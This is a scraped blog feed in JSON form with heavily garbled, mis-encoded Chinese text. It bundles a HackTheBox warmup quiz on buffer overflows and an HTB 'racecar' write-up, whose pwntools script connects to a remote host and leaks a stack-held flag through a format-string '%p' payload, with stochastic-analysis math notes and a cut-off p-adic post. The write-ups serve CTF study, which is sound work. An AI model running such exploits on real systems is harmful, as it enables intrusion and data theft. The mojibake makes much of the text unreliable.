ç¬¬äº”é¢˜123456789101112â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰ â—‰â—‰ HINT: Only functions inside &#x27;main()&#x27; are called. â—‰â—‰ Also, the functions these functions call. â—‰â—‰ â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰[*] Question number 0x5:Which custom function is never called? (e.g. vuln())&gt;&gt; 1234567&gt;&gt; under_constructionâ™  â™  â™  â™  â™  â™  â™  â™  â™  â™  â™ â™  â™ â™  Correct â™ â™  â™ â™  â™  â™  â™  â™  â™  â™  â™  â™  â™  â™  ç¬¬å…­é¢˜1234567891011â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰ â—‰â—‰ HINT: Which function reads the string from the stdin? â—‰â—‰ â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰[*] Question number 0x6:What is the name of the standard function that could trigger a Buffer Overflow? (e.g. fprintf())&gt;&gt; 1234567&gt;&gt; scanf()â™  â™  â™  â™  â™  â™  â™  â™  â™  â™  â™ â™  â™ â™  Correct â™ â™  â™ â™  â™  â™  â™  â™  â™  â™  â™  â™  â™  â™  ç¬¬ä¸ƒé¢˜1234567891011121314â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰ â—‰â—‰ HINT: A Segmentation Fault occurs when the return â—‰â—‰ address is overwritten with an invalid address. â—‰â—‰ â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰[*] Question number 0x7:Insert 30, then 39, then 40 &#x27;A&#x27;s in the program and see the output.After how many bytes a Segmentation Fault occurs (in hex or decimal)?&gt;&gt; 12345678910111213â””â”€$ python3 -c &quot;print(&#x27;A&#x27;*30)&quot; | ./mainEnter your name:Welcome user!â””â”€$ python3 -c &quot;print(&#x27;A&#x27;*39)&quot; | ./mainEnter your name:Welcome user!â””â”€$ python3 -c &quot;print(&#x27;A&#x27;*40)&quot; | ./mainEnter your name:Welcome user!Segmentation fault 1234567&gt;&gt; 40â™  â™  â™  â™  â™  â™  â™  â™  â™  â™  â™ â™  â™ â™  Correct â™ â™  â™ â™  â™  â™  â™  â™  â™  â™  â™  â™  â™  â™  ç¬¬å…«é¢˜123456789101112131415â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰ â—‰â—‰ HINT: Run &#x27;gdb ./main&#x27; to open the binary in the debugger, then â—‰â—‰ run &#x27;p &lt;function_name&gt;&#x27; to see the address of a function. â—‰â—‰ â—‰â—‰ e.g. pwndbg&gt; p main â—‰â—‰ $2 = &#123;&lt;text variable, no debug info&gt;&#125; 0x401294 &lt;main&gt; â—‰â—‰ â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰â—‰[*] Question number 0x8:What is the address of &#x27;under_construction()&#x27; in hex? (e.g. 0x401337)&gt;&gt; 123456â””â”€$ gdb -q ./mainReading symbols from ./main...(No debugging symbols found in ./main)(gdb) p under_construction$1 = &#123;&lt;text variable, no debug info&gt;&#125; 0x4011d6 &lt;under_construction&gt; 1234567891011&gt;&gt; 0x4011d6â™  â™  â™  â™  â™  â™  â™  â™  â™  â™  â™ â™  â™ â™  Correct â™ â™  â™ â™  â™  â™  â™  â™  â™  â™  â™  â™  â™  â™ Great job! It&#x27;s high time you solved your first challenge! Here is the flag!HTB&#123;w4rm35t_w4rmup_3v3r&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Pwn","slug":"CTF/Pwn","permalink":"https://archer-baiyi.github.io/categories/CTF/Pwn/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://archer-baiyi.github.io/tags/Pwn/"},{"name":"æ”»é˜²ä¸–ç•Œ","slug":"æ”»é˜²ä¸–ç•Œ","permalink":"https://archer-baiyi.github.io/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"}]},{"title":"HTB racecar Writeup","slug":"CTF/Pwn/HTB-racecar-Writeup","date":"2025-08-18T21:56:17.000Z","updated":"2025-08-18T22:20:54.710Z","comments":true,"path":"2025/08/18/CTF/Pwn/HTB-racecar-Writeup/","permalink":"https://archer-baiyi.github.io/2025/08/18/CTF/Pwn/HTB-racecar-Writeup/","excerpt":"åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´è¯»å–ä¿¡æ¯ã€‚","text":"é¢˜ç›® ä»£ç å®¡è®¡ç”¨IDAåæ±‡ç¼–å‡ºæ¥çš„ä¼ªä»£ç ï¼š 12345678910111213141516171819202122232425262728int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v3; // eax unsigned int v5; // [esp+0h] [ebp-Ch] v5 = __readgsdword(0x14u); setup(); banner(); info(); while ( check ) &#123; v3 = menu(); if ( v3 == 1 ) &#123; car_info(); &#125; else if ( v3 == 2 ) &#123; check = 0; car_menu(); &#125; else &#123; printf(&quot;\\n%s[-] Invalid choice!%s\\n&quot;, &quot;\\x1B[1;31m&quot;, &quot;\\x1B[1;36m&quot;); &#125; &#125; return __readgsdword(0x14u) ^ v5;&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889unsigned int banner()&#123; time_t v0; // eax char *s1; // [esp+0h] [ebp-28h] char *s2; // [esp+4h] [ebp-24h] _DWORD v4[5]; // [esp+8h] [ebp-20h] unsigned int v5; // [esp+1Ch] [ebp-Ch] v5 = __readgsdword(0x14u); v4[0] = &quot;\\x1B[1;33m&quot;; v4[1] = &quot;\\x1B[1;36m&quot;; v4[2] = &quot;\\x1B[1;32m&quot;; v4[3] = &quot;\\x1B[1;31m&quot;; v4[4] = &quot;\\x1B[1;34m&quot;; v0 = time(0); srand(v0); s1 = (char *)v4[rand() % 5]; do s2 = (char *)v4[rand() % 5]; while ( !strcmp(s1, s2) ); puts(asc_1558); printf(&quot;%s ______ %s|xxx|\\n&quot;, s1, &quot;\\x1B[1;35m&quot;); printf(&quot;%s /|_||_\\\\`.__ %s| F |\\n&quot;, s1, &quot;\\x1B[1;35m&quot;); printf(&quot;%s ( _ _ _\\\\ %s|xxx|\\n&quot;, s1, &quot;\\x1B[1;35m&quot;); printf(&quot;%s*** =`-(_)--(_)-&#x27; %s| I |\\n&quot;, s1, &quot;\\x1B[1;35m&quot;); printf(&quot; %s|xxx|\\n&quot;, &quot;\\x1B[1;35m&quot;); printf(&quot; %s| N |\\n&quot;, &quot;\\x1B[1;35m&quot;); printf(&quot; %s|xxx|\\n&quot;, &quot;\\x1B[1;35m&quot;); printf(&quot; %s| I |\\n&quot;, &quot;\\x1B[1;35m&quot;); printf(&quot; %s|xxx|\\n&quot;, &quot;\\x1B[1;35m&quot;); printf(&quot;%s _-_- _/\\\\______\\\\__ %s| S |\\n&quot;, s2, &quot;\\x1B[1;35m&quot;); printf(&quot;%s _-_-__ / ,-. -|- ,-.`-. %s|xxx|\\n&quot;, s2, &quot;\\x1B[1;35m&quot;); printf(&quot;%s _-_- `( o )----( o )-&#x27; %s| H |\\n&quot;, s2, &quot;\\x1B[1;35m&quot;); printf(&quot;%s `-&#x27; `-&#x27; %s|xxx|\\n&quot;, s2, &quot;\\x1B[1;35m&quot;); puts(byte_1888); return __readgsdword(0x14u) ^ v5;&#125;unsigned int info()&#123; void *buf; // [esp+4h] [ebp-14h] char *s; // [esp+8h] [ebp-10h] unsigned int v3; // [esp+Ch] [ebp-Ch] v3 = __readgsdword(0x14u); buf = malloc(0x20u); s = (char *)malloc(0x20u); printf(&quot;\\n%sInsert your data:\\n\\n&quot;, &quot;\\x1B[1;36m&quot;); printf(&quot;Name: &quot;); read(0, buf, 0x1Fu); *((_BYTE *)buf + strlen((const char *)buf) - 1) = 0; printf(&quot;Nickname: &quot;); read(0, s, 0x1Fu); s[strlen(s) - 1] = 0; printf( &quot;\\n%s[+] Welcome [%s%s%s]!\\n\\n%s[*] Your name is [%s%s%s] but everybody calls you.. [%s%s%s]!&quot;, &quot;\\x1B[1;32m&quot;, &quot;\\x1B[1;33m&quot;, buf, &quot;\\x1B[1;32m&quot;, &quot;\\x1B[1;36m&quot;, &quot;\\x1B[1;33m&quot;, buf, &quot;\\x1B[1;36m&quot;, &quot;\\x1B[1;33m&quot;, s, &quot;\\x1B[1;36m&quot;); printf(&quot;\\n[*] Current coins: [%d]\\n&quot;, coins); return __readgsdword(0x14u) ^ v3;&#125;unsigned int car_info()&#123; unsigned int v1; // [esp+Ch] [ebp-Ch] v1 = __readgsdword(0x14u); puts(asc_1BB0); puts(aCar1Stats); printf(aSpeedS, &quot;\\x1B[1;31m&quot;, &quot;\\x1B[1;33m&quot;, &quot;\\x1B[1;36m&quot;); printf(aAccelerationS, &quot;\\x1B[1;31m&quot;, &quot;\\x1B[1;33m&quot;, &quot;\\x1B[1;36m&quot;); printf(aHandlingS, &quot;\\x1B[1;31m&quot;, &quot;\\x1B[1;33m&quot;, &quot;\\x1B[1;32m&quot;, &quot;\\x1B[1;36m&quot;); puts(asc_1BB0); puts(aCar2Stats); printf(aSpeedS_0, &quot;\\x1B[1;31m&quot;, &quot;\\x1B[1;33m&quot;, &quot;\\x1B[1;32m&quot;, &quot;\\x1B[1;36m&quot;); printf(aAccelerationS_0, &quot;\\x1B[1;31m&quot;, &quot;\\x1B[1;33m&quot;, &quot;\\x1B[1;32m&quot;, &quot;\\x1B[1;36m&quot;); printf(aHandlingS_0, &quot;\\x1B[1;31m&quot;, &quot;\\x1B[1;36m&quot;); puts(asc_1BB0); return __readgsdword(0x14u) ^ v1;&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485int car_menu()&#123; time_t v0; // eax size_t i; // eax size_t v2; // edx int result; // eax int v4; // [esp+0h] [ebp-58h] int v5; // [esp+0h] [ebp-58h] int v6; // [esp+4h] [ebp-54h] int v7; // [esp+4h] [ebp-54h] unsigned int v8; // [esp+8h] [ebp-50h] int v9; // [esp+Ch] [ebp-4Ch] int v10; // [esp+10h] [ebp-48h] void *buf; // [esp+18h] [ebp-40h] FILE *stream; // [esp+1Ch] [ebp-3Ch] char v13[44]; // [esp+20h] [ebp-38h] BYREF unsigned int v14; // [esp+4Ch] [ebp-Ch] v14 = __readgsdword(0x14u); v4 = -1; v6 = -1; do &#123; printf(aSelectCar1); v9 = read_int(v4, v6); if ( v9 != 2 &amp;&amp; v9 != 1 ) printf(&quot;\\n%s[-] Invalid choice!%s\\n&quot;, &quot;\\x1B[1;31m&quot;, &quot;\\x1B[1;36m&quot;); &#125; while ( v9 != 2 &amp;&amp; v9 != 1 ); v10 = race_type(); v0 = time(0); srand(v0); if ( v9 == 1 &amp;&amp; v10 == 2 || v9 == 2 &amp;&amp; v10 == 2 ) &#123; v5 = rand() % 10; v7 = rand() % 100; &#125; else if ( v9 == 1 &amp;&amp; v10 == 1 || v9 == 2 &amp;&amp; v10 == 1 ) &#123; v5 = rand() % 100; v7 = rand() % 10; &#125; else &#123; v5 = rand() % 100; v7 = rand() % 100; &#125; v8 = 0; for ( i = strlen(&quot;\\n[*] Waiting for the race to finish...&quot;); ; i = strlen(&quot;\\n[*] Waiting for the race to finish...&quot;) ) &#123; v2 = i; result = v8; if ( v2 &lt;= v8 ) break; putchar(aWaitingForTheR[v8]); if ( aWaitingForTheR[v8] == 46 ) sleep(0); ++v8; &#125; if ( v9 == 1 &amp;&amp; (result = v5, v5 &lt; v7) || v9 == 2 &amp;&amp; (result = v5, v5 &gt; v7) ) &#123; printf(&quot;%s\\n\\n[+] You won the race!! You get 100 coins!\\n&quot;, &quot;\\x1B[1;32m&quot;); coins += 100; printf(&quot;[+] Current coins: [%d]%s\\n&quot;, coins, &quot;\\x1B[1;36m&quot;); printf(&quot;\\n[!] Do you have anything to say to the press after your big victory?\\n&gt; %s&quot;, &quot;\\x1B[0m&quot;); buf = malloc(0x171u); stream = fopen(&quot;flag.txt&quot;, &quot;r&quot;); if ( !stream ) &#123; printf(&quot;%s[-] Could not open flag.txt. Please contact the creator.\\n&quot;, &quot;\\x1B[1;31m&quot;); exit(105); &#125; fgets(v13, 44, stream); read(0, buf, 0x170u); puts(&quot;\\n\\x1B[3mThe Man, the Myth, the Legend! The grand winner of the race wants the whole world to know this: \\x1B[0m&quot;); return printf((const char *)buf); &#125; else if ( v9 == 1 &amp;&amp; (result = v5, v5 &gt; v7) || v9 == 2 &amp;&amp; (result = v5, v5 &lt; v7) ) &#123; printf(&quot;%s\\n\\n[-] You lost the race and all your coins!\\n&quot;, &quot;\\x1B[1;31m&quot;); coins = 0; return printf(&quot;[+] Current coins: [%d]%s\\n&quot;, 0, &quot;\\x1B[1;36m&quot;); &#125; return result;&#125; é¦–å…ˆä»”ç»†é˜…è¯»ä»£ç åä¼šå‘ç°car_menu()å‡½æ•°ä¸­çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼š 123read(0, buf, 0x170u);puts(&quot;\\n\\x1B[3mThe Man, the Myth, the Legend! The grand winner of the race wants the whole world to know this: \\x1B[0m&quot;);return printf((const char *)buf); å®ƒä¼šå°†æˆ‘ä»¬è¾“å…¥çš„å†…å®¹ç›´æ¥ä¼ é€’ç»™printfå‡½æ•°ã€‚æ‰€ä»¥æˆ‘ä»¬æ¥ä¸‹æ¥éœ€è¦åšçš„å°±æ˜¯2ç‚¹ï¼š å¦‚ä½•è§¦å‘è¿™ä¸ªæ¼æ´ï¼Œæˆ–è€…è¯´å¦‚ä½•è¿›å…¥è¿™ä¸ªifåˆ†æ”¯ï¼› å¦‚ä½•åˆ©ç”¨è¿™ä¸ªæ¼æ´å»è¯»å–ä¿¡æ¯ï¼Œæ¯”å¦‚è¯´flagçš„å†…å®¹ã€‚ 1. å¦‚ä½•è¿›å…¥è¿™ä¸ªifåˆ†æ”¯ï¼Ÿ ä¸éš¾å‘ç°ï¼Œå½“è½¦çš„ç±»å‹é€‰1ï¼Œä¸”æ¯”èµ›ç±»å‹é€‰2çš„æ—¶å€™ï¼Œæˆ‘ä»¬è·èƒœçš„æ¦‚ç‡ä¸º P( \\text{rand() mod } 10 < \\text{rand() mod }100 ) = 1-\\frac{1+\\cdots+10}{1000} = 94.5\\%éå¸¸é«˜ï¼Œæˆ–è€…è¯´æ˜¯è·èƒœæ¦‚ç‡æœ€é«˜çš„é€‰æ‹©ã€‚è€Œè·èƒœä¹‹åä¾¿å¯ä»¥è¾“å…¥è·å¥–æ„Ÿè¨€ï¼Œè¿™ä¸ªæ—¶å€™ä¾¿å¯ä»¥å‰é¢æåˆ°çš„æ¼æ´ã€‚ 2. å¦‚ä½•åˆ©ç”¨ æ³¨æ„åˆ°åœ¨è¿™é‡Œï¼š 12stream = fopen(&quot;flag.txt&quot;, &quot;r&quot;);fgets(v13, 44, stream); ç¨‹åºå°†å°†flagè¯»è¿›æ ˆä¸Šçš„v13[44]ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥åˆ©ç”¨%pè¯»å–stackä¸Šçš„å†…å®¹ï¼Œç„¶ååˆ¤æ–­å…¶ä¸­å“ªéƒ¨åˆ†ä¸ºflagçš„å†…å®¹ã€‚ Exploit123456789101112131415161718192021222324252627282930313233343536373839from pwn import *import rer = remote(&quot;94.237.122.218&quot;, 33681)r.recvuntil(b&quot;Name:&quot;)r.sendline(b&quot;A&quot;)r.recvuntil(b&quot;Nickname:&quot;)r.sendline(b&quot;B&quot;)r.recvuntil(b&quot;2. Car selection&quot;)r.recvuntil(b&quot;&gt;&quot;)r.sendline(b&quot;2&quot;)r.recvuntil(b&quot;Select car&quot;)r.recvuntil(b&quot;&gt;&quot;)r.sendline(b&quot;1&quot;)r.recvuntil(b&quot;Select race&quot;)r.recvuntil(b&quot;&gt;&quot;)r.sendline(b&quot;2&quot;)r.recvuntil(b&quot;victory?&quot;)# å‡å¦‚æ²¡æœ‰æ”¶åˆ°åˆ™è¯´æ˜å½“å‰å°è¯•æ²¡æœ‰æˆåŠŸï¼Œå†é‡æ–°è·‘ä¸€æ¬¡è„šæœ¬å³å¯ã€‚payload = b&quot;%p &quot; * 40r.sendline(payload)data = r.recvall()hex_words = re.findall(rb&#x27;0x[0-9a-fA-F]&#123;1,8&#125;&#x27;, data)blob = bytearray()for hw in hex_words: blob += int(hw,16).to_bytes(4,&#x27;little&#x27;)start = blob.find(b&#x27;H&#x27;)end = blob.find(b&#x27;&#125;&#x27;, start)flag = blob[start:end+1].decode()print(flag)# HTB&#123;why_d1d_1_s4v3_th3_fl4g_0n_th3_5t4ck?!&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Pwn","slug":"CTF/Pwn","permalink":"https://archer-baiyi.github.io/categories/CTF/Pwn/"}],"tags":[{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/tags/HTB/"},{"name":"Pwn","slug":"Pwn","permalink":"https://archer-baiyi.github.io/tags/Pwn/"}]},{"title":"Stochastic Analysis éšæœºåˆ†æ","slug":"TUM  æ•°å­¦ ç¬”è®°/Stochastic Analysis éšæœºåˆ†æ/Stochastic-Analysis-éšæœºåˆ†æ","date":"2025-07-17T17:56:32.000Z","updated":"2025-07-17T18:59:23.632Z","comments":true,"path":"2025/07/17/TUM  æ•°å­¦ ç¬”è®°/Stochastic Analysis éšæœºåˆ†æ/Stochastic-Analysis-éšæœºåˆ†æ/","permalink":"https://archer-baiyi.github.io/2025/07/17/TUM%20%20%E6%95%B0%E5%AD%A6%20%E7%AC%94%E8%AE%B0/Stochastic%20Analysis%20%E9%9A%8F%E6%9C%BA%E5%88%86%E6%9E%90/Stochastic-Analysis-%E9%9A%8F%E6%9C%BA%E5%88%86%E6%9E%90/","excerpt":"éšæœºåˆ†æç›¸å…³ç¬”è®°","text":"Quadratic VariationDefinition: Let $E_n = \\{0 = t_1^{(n)} &lt; \\ldots &lt; t_{l_n}^{(n)}\\}$ be a sequence of partitions with $s(E_n) := \\sup |t_{i+1}^{(n)} - t_i^{(n)}| \\to 0$. Then, the continuous function $X_t$ has continuous quadratic variation along the sequence $E_n$ if\\langle X \\rangle_t = \\lim_{n \\to \\infty} \\sum_{\\substack{t_j \\in E_n \\\\ t_{j+1} \\leq t}} \\left( X_{t_{j+1}} - X_{t_j} \\right)^2exists $P$-a.s. and is a continuous function of $t$. Remark: For any continuous function $X_t$, its quadratic variation $t \\mapsto \\langle X \\rangle_t$ is monotone increasing (non-decreasing). å…¶å®ä¸éš¾å‘ç°ï¼Œè¿™ä¸ªquadratic variationä¸æ™®é€šçš„varianceéå¸¸åƒï¼Œæœ‰å¾ˆå¤šç±»ä¼¼çš„æ€§è´¨ã€‚ Lemma: Let $X$ be a continuous function, for $a,b \\in \\mathbb{R}$ we have\\langle aX+b \\rangle = a^2 \\langle X \\rangle Proof: By definition, for all $t$ we have: \\begin{align*} \\langle aX+b \\rangle_t &= \\lim_{n \\to \\infty} \\sum_{\\substack{t_j \\in E_n \\\\ t_{j+1} \\leq t}} \\left( aX_{t_{j+1}}+b - aX_{t_j} -b \\right)^2 \\\\ &= a^2\\lim_{n \\to \\infty} \\sum_{\\substack{t_j \\in E_n \\\\ t_{j+1} \\leq t}} \\left( X_{t_{j+1}} - X_{t_j} \\right)^2 \\\\ &= a^2 \\langle X \\rangle \\end{align*}$\\square$ Cross Variationåœ¨è¿™ç« é‡Œï¼Œæˆ‘ä»¬å‡è®¾$X,Y$éƒ½æ˜¯continuous functionï¼Œå¹¶ä¸”æ‹¥æœ‰continuous quadratic variations $\\langle X \\rangle, \\langle Y \\rangle$. Definition: The cross-variation $\\langle X,Y \\rangle$ is defined as\\langle X,Y \\rangle_t = \\underset{n \\to \\infty}{\\text{lim}} \\sum_{\\substack{t_i \\in E_n \\\\ t_{i+1} \\leq t}} (X_{t_{j+1}} - X_{t_j})(Y_{t_{j+1}} - Y_{t_j})(if the limit exists). Clearly,\\langle X,X \\rangle = \\langle X \\rangle Lemma: Let $X,Y$ be continuous functions with continuous quadratic variations $\\langle X \\rangle, \\langle Y \\rangle$, for $a,b,c,d \\in \\mathbb{R}$ we have\\langle aX+b,cY+d \\rangle = ac\\langle X,Y \\rangle Proof: By definition, for all $t$ we have: \\begin{align*} \\langle aX+b,cY+d \\rangle_t &= \\underset{n \\to \\infty}{\\text{lim}} \\sum_{\\substack{t_i \\in E_n \\\\ t_{i+1} \\leq t}} (aX_{t_{j+1}}+b - aX_{t_j}-b)(cY_{t_{j+1}}+d - cY_{t_j}-d) \\\\ &= ac \\cdot \\underset{n \\to \\infty}{\\text{lim}} \\sum_{\\substack{t_i \\in E_n \\\\ t_{i+1} \\leq t}} (X_{t_{j+1}} - X_{t_j})(Y_{t_{j+1}} - Y_{t_j}) \\\\ &= ac\\langle X,Y \\rangle \\end{align*}$\\square$ Lemma: Let $X,Y$ be continuous functions with continuous quadratic variations $\\langle X \\rangle, \\langle Y \\rangle$, we have \\langle X+Y,X+Y \\rangle = \\langle X \\rangle + 2\\langle X,Y \\rangle + \\langle Y \\rangle Proof: By definition, for all $t$ we have: \\begin{align*} \\langle X+Y \\rangle_t &= \\lim_{n \\to \\infty} \\sum_{\\substack{t_j \\in E_n \\\\ t_{j+1} \\leq t}} \\left( X_{t_{j+1}}+ Y_{t_{j+1}} - X_{t_j} - Y_{t_{j}}\\right)^2 \\\\ &= \\lim_{n \\to \\infty} \\sum_{\\substack{t_j \\in E_n \\\\ t_{j+1} \\leq t}} \\left( (X_{t_{j+1}}- X_{t_j})+ (Y_{t_{j+1}} - Y_{t_{j}})\\right)^2\\\\ &= \\lim_{n \\to \\infty} \\sum_{\\substack{t_j \\in E_n \\\\ t_{j+1} \\leq t}} \\Bigl(\\left( X_{t_{j+1}}- X_{t_j}\\right)^2 +2\\left( X_{t_{j+1}}- X_{t_j}\\right)\\left(Y_{t_{j+1}} - Y_{t_{j}}\\right) +\\left(Y_{t_{j+1}} - Y_{t_{j}}\\right)^2 \\Bigl) \\\\ &= \\langle X \\rangle + 2\\langle X,Y \\rangle + \\langle Y \\rangle \\end{align*}$\\square$ Lemma: Let $X,Y$ be continuous functions with continuous quadratic variations $\\langle X \\rangle, \\langle Y \\rangle$ and $\\langle X \\rangle \\equiv 0$, then $\\langle X+Y \\rangle =0$.","categories":[{"name":"TUM æ•°å­¦ ç¬”è®°","slug":"TUM-æ•°å­¦-ç¬”è®°","permalink":"https://archer-baiyi.github.io/categories/TUM-%E6%95%B0%E5%AD%A6-%E7%AC%94%E8%AE%B0/"},{"name":"Stochastic Analysis éšæœºåˆ†æ","slug":"TUM-æ•°å­¦-ç¬”è®°/Stochastic-Analysis-éšæœºåˆ†æ","permalink":"https://archer-baiyi.github.io/categories/TUM-%E6%95%B0%E5%AD%A6-%E7%AC%94%E8%AE%B0/Stochastic-Analysis-%E9%9A%8F%E6%9C%BA%E5%88%86%E6%9E%90/"}],"tags":[{"name":"Stochastic Analysis","slug":"Stochastic-Analysis","permalink":"https://archer-baiyi.github.io/tags/Stochastic-Analysis/"},{"name":"éšæœºåˆ†æ","slug":"éšæœºåˆ†æ","permalink":"https://archer-baiyi.github.io/tags/%E9%9A%8F%E6%9C%BA%E5%88%86%E6%9E%90/"}]},{"title":"å¦‚ä½•éƒ¨ç½²CTFDdæ¨¡æ¿","slug":"CTF/General/å¦‚ä½•éƒ¨ç½²CTFDdæ¨¡æ¿","date":"2025-07-10T10:50:55.000Z","updated":"2025-07-10T11:57:07.081Z","comments":true,"path":"2025/07/10/CTF/General/å¦‚ä½•éƒ¨ç½²CTFDdæ¨¡æ¿/","permalink":"https://archer-baiyi.github.io/2025/07/10/CTF/General/%E5%A6%82%E4%BD%95%E9%83%A8%E7%BD%B2CTFDd%E6%A8%A1%E6%9D%BF/","excerpt":"éƒ¨ç½²CTFDdæ¨¡æ¿","text":"","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"General","slug":"CTF/General","permalink":"https://archer-baiyi.github.io/categories/CTF/General/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://archer-baiyi.github.io/tags/ctf/"},{"name":"ctfd","slug":"ctfd","permalink":"https://archer-baiyi.github.io/tags/ctfd/"}]},{"title":"P-adic Numbers and Hensel's Lemma","slug":"TUM  æ•°å­¦ ç¬”è®°/P-adic Numbers and Hensels Lemma/P-adic-Numbers-and-Hensel-s-Lemma","date":"2025-07-07T10:05:37.000Z","updated":"2025-07-07T10:07:01.196Z","comments":true,"path":"2025/07/07/TUM  æ•°å­¦ ç¬”è®°/P-adic Numbers and Hensels Lemma/P-adic-Numbers-and-Hensel-s-Lemma/","permalink":"https://archer-baiyi.github.io/2025/07/07/TUM%20%20%E6%95%B0%E5%AD%A6%20%E7%AC%94%E8%AE%B0/P-adic%20Numbers%20and%20Hensels%20Lemma/P-adic-Numbers-and-Hensel-s-Lemma/","excerpt":"","text":"Introductionç›¸ä¿¡å¤§å®¶æˆ–å¤šæˆ–å°‘å¬è¿‡æˆ–è€…ç†Ÿæ‚‰è®¡ç®—æœºé‡Œçš„ï¼ˆäºŒè¿›åˆ¶ï¼‰â€œè¡¥ç â€è¿™ä¸ªæ¦‚å¿µï¼šæ¯”å¦‚è¯´å½“æˆ‘ä»¬ç”¨$(0001)_2$æ¥è¡¨ç¤º$1$æ—¶ï¼Œå¯ä»¥ç”¨$(1111)_2$ ï¼ˆ$= (1111)_2 \\text{ xor } (0001)_2 + 1$ï¼‰æ¥è¡¨ç¤º$-1$ã€‚ è€Œå½“æˆ‘ä»¬å°†å…¶è½¬åŒ–æˆæˆ‘ä»¬ç†Ÿæ‚‰çš„åè¿›åˆ¶ï¼ˆ$(1111)_2 = \\sum^{3}_{i=0}1\\cdot 2^n = 15$ï¼‰çš„è¯ï¼Œæˆ‘ä»¬å¯ä»¥è§‚å¯Ÿåˆ°ä¸‹é¢è¿™å‡ ä¸ªç­‰å¼ï¼š \\begin{align*} -1 &\\equiv 15 \\quad \\text{ mod }2\\\\ -1 &\\equiv 15 \\quad \\text{ mod }2^2\\\\ -1 &\\equiv 15 \\quad \\text{ mod }2^3\\\\ -1 &\\equiv 15 \\quad \\text{ mod }2^4\\\\ \\end{align*}è€Œè¿™ä¸ª4åˆšå¥½æ˜¯æˆ‘ä»¬çš„binary code 